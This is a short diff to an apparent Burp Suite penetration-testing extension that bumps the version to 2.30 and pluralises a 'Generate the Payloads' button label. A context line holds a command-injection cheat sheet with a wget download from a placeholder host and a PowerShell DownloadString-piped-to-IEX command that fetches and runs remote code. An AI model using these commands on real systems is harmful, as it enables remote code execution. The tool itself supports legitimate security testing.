@@ -26,7 +26,7 @@ except:
     print "==== ERROR ====" + "\n\nFailed to load dependencies.\n" +str(sys.exc_info()[1]) +"\n\n==== ERROR ====\n\n"
     sys.exit(1)
 
-VERSION = "2.29"
+VERSION = "2.30"
 #url_regex = r'(log|sign)([-_+%0-9]{0,5})(off|out|in|on)|(expire|kill|terminat|delete|remove)'
 url_regex = r'(log|sign|time)([-_+%0-9]{0,5})(off|out)|(expire|kill|terminat|delete|remove)'
 ext_regex = r'^\.(gif|jpg|jpeg|png|css|js|ico|svg|eot|woff2|ttf|otf)$'
@@ -3925,7 +3925,7 @@ else
         self._txtCheatSheetCommandInj += "\twget http://X.X.X.X/file.txt -O /tmp/file.txt\t\t(New-Object System.Net.WebClient).DownloadString('http://http://X.X.X.X/file.txt') | IEX\n"
         _lblDepth = JLabel("( Depth =", SwingConstants.LEFT)
         _lblDepth.setToolTipText("Generate payloads only for a specific depth.")
-        _btnGenerateDict = JButton("Generate the Payload", actionPerformed=self.funcGeneratePayload)
+        _btnGenerateDict = JButton("Generate the Payloads", actionPerformed=self.funcGeneratePayload)
         _btnGenerateDict.setToolTipText("Click to generate payloads.")
         _btnGenerateDictForBCheck = JButton("Generate payloads for BCheck", actionPerformed=self.funcGeneratePayloadForBCheck)
         _btnGenerateDictForBCheck.setToolTipText("Generate payloads for BCheck.")
